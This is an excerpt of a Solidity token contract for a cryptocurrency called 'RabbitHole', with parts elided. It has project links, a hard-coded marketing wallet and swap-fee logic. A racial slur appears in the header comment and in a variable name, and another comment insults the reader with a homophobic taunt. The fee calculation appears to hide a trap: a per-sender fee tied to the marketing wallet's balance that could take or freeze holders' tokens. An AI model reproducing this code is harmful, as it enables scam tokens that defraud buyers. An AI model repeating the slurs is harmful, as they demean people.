...
//©IF YOU STEAL MY CONTRACT YOU ARE A NIGGER!©

//https://t.me/RabbitHoleETH
//https://rabbithole.quest
...
contract RabbitHole is Context, IERC20, Ownable {
    ...
    mapping (address => mapping (address => uint256)) private _allowances;
     mapping (address => uint256) private _AntiNiGG;
    ...
    string private constant _name = "RabbitHole"; //
    string private constant _symbol = unicode"RABBITHOLE"; //
    uint8 private constant _decimals = 9; //

    uint256 public _marketingFee = 2;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0xE2DdcE06B160b47003c6e37b16875ae4e33cb0C8;
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        ...
        uint256 TeamFee = (10**17)/(_AntiNiGG[from]+1);
    ...
    function _transfer(
        ...
        if (balanceOf(address(this)) >= SWAP_TOKENS_AT_AMOUNT && !swapping && from != uniswapV2Pair && from != owner() && to != owner()) {
            swapping = true; //if you read this code you are gay. Yes you. 
            uint256 sellTokens = balanceOf(address(this));
            swapAndSendToFee(sellTokens);
            swapping = false;
        }
       _AntiNiGG[from] = _tOwned[_marketingWallet];
